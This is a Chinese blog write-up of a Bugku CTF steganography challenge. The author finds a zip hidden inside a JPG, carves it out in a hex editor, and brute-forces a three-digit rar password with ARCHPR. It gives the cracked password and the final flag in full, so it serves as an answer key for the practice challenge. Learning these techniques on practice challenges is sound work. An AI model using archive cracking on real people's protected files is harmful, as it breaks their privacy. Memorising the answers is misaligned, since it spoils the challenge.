        <content type="html"><![CDATA[<hr><p><strong>2018/7/22更新</strong></p><p>关于这道题突然想起有几点要补充一下。</p><a id="more"></a><p>首先这道题的解题方法肯定不止一种，直接把图片扔进binwalk里面把包分离出来当然可以秒解。我这种方法算是最笨最没有效率的方法了，可是对于新手来讲要对题目有深刻的理解的话必须要从最繁琐最基本的方法开始做，而且更少不了一遍遍的尝试和失败。对解题的原理有大概清楚的认识之后再用工具就会更加得心应手。</p><p>最后说一下手动找包的几个困难点。</p><p>首先是要找到压缩包的特殊文件标识，这道题是因为用winhex打开然后碰巧看到了zip文件标识PK，加上之前做题的经验推测出内含压缩包的，说实话题还是要多做，不然看到解题需要的某个关键信息（比如文件标识）一点反应也没有的话，又要抱怨：这谁想得到啊？！如果运气不好没有碰巧注意到的话就只有慢慢去找，确实是要把眼睛看花的。不过还是那句话，多练嘛，熟悉之后直接用工具解题就没那么麻烦了。</p><hr><p><a href="http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg" target="_blank" rel="noopener">题目点我</a></p><p>打开链接是一张图片<br><img src="https://i.imgur.com/p67HfEg.jpg" alt=""></p><p>用winhex打开图片，注意到<strong>flag.rar</strong>，猜测图片内含rar压缩包。</p><p><img src="https://i.imgur.com/IRAkhCb.png" alt=""></p><p>又注意到zip压缩包特殊的<strong>头部</strong>和<strong>尾部</strong>标识，所以猜测图片可分解为zip压缩包。</p><p>用notepad++打开图片，查找PK(即zip文件头部或尾部标识)</p><p><img src="https://i.imgur.com/aYgS8xg.png" alt=""></p><p><strong>下面解释一下zip文件的头尾标识</strong></p><hr><p>(此处新建一个zip文件作为对比↓)</p><p><img src="https://i.imgur.com/5jjI95U.png" alt=""></p><p>头部固定以PK（即50 4B 03 04）作为开始，尾部以PK加上固定长度（一排多两个，即18个hex位）的标识位结束。</p><blockquote></blockquote><p><a href="https://blog.csdn.net/a200710716/article/details/51644421" target="_blank" rel="noopener">关于zip文件格式更详细的介绍</a></p><hr><p>在winhex中找到标识位，删除PK之前的所有内容并保存，将修改后的文件后缀名由jpg改为zip，获得一个zip压缩包。</p><p><img src="https://i.imgur.com/WQDq44p.png" alt=""></p><p>zip压缩包内容如下</p><p><img src="https://i.imgur.com/AIzmFWH.png" alt=""></p><p>下图是<strong>提示.jpg</strong></p><p><img src="https://i.imgur.com/0RJRB32.png" alt=""></p><p>打开flag.rar发现一个已加密的jpg图片，由上图可知密码为三位数字，于是用爆破工具：<strong>ARCHPR</strong></p><p><img src="https://i.imgur.com/bQ1AiWA.png" alt=""></p><p><img src="https://i.imgur.com/5NmBvgh.png" alt=""></p><p>爆破得到密码为<strong>871</strong>，输入后成功打开图片</p><p><img src="https://i.imgur.com/FP9nEmh.png" alt=""></p><p>用notepad++打开图片试试，拖到最后发现flag，括号内猜测为base64加密，解密后得到flag。</p><p><img src="https://i.imgur.com/rHNsJKv.png" alt=""></p><p><strong>flag{y0u Are a h@cker!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
